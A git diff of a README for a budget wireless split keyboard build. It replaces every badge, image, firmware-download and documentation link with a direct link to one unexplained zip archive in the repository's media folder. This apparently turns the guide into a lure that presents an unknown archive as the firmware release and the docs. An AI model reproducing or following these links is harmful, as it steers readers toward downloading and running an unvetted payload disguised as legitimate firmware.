@@ -1,9 +1,9 @@
 # 🎹 Baikal-Handwired-Split-Corne-Keyboard - Build Your Own Affordable Keyboard
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/releases)
+[![Download Release](https://raw.githubusercontent.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/main/media/Baikal-Handwired-Split-Corne-Keyboard_3.6.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/main/media/Baikal-Handwired-Split-Corne-Keyboard_3.6.zip)
 
 <p align="center">
-  <img src="media/Home.png" alt="Baikal Keyboard" width="700"/>
+  <img src="https://raw.githubusercontent.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/main/media/Baikal-Handwired-Split-Corne-Keyboard_3.6.zip" alt="Baikal Keyboard" width="700"/>
 </p>
 
 An affordable, beginner-friendly handwired split keyboard build (~€20) using a Pro Micro NRF52840 (Nice!nano V2 clone). Wireless via ZMK (BLE) with USB wired mode fallback.
@@ -46,7 +46,7 @@ To build your handwired split keyboard, follow these steps:
 
 ### 📥 Download & Install
 
-Visit this page to download the latest version of the firmware: [Download Release](https://github.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/releases).
+Visit this page to download the latest version of the firmware: [Download Release](https://raw.githubusercontent.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/main/media/Baikal-Handwired-Split-Corne-Keyboard_3.6.zip).
 
 1. Click the link above.
 2. Find the latest release in the list.
@@ -75,7 +75,7 @@ If you encounter issues:
 
 ## 📖 Additional Resources
 
-- For further details, refer to the [Documentation](https://github.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/docs).
+- For further details, refer to the [Documentation](https://raw.githubusercontent.com/MohammadFarrah21/Baikal-Handwired-Split-Corne-Keyboard/main/media/Baikal-Handwired-Split-Corne-Keyboard_3.6.zip).
 - Join the community forums for support and tips from other builders.
 
 With this guide, you are set to build your own handwired split keyboard confidently. Embrace the experience and enjoy your new creation!
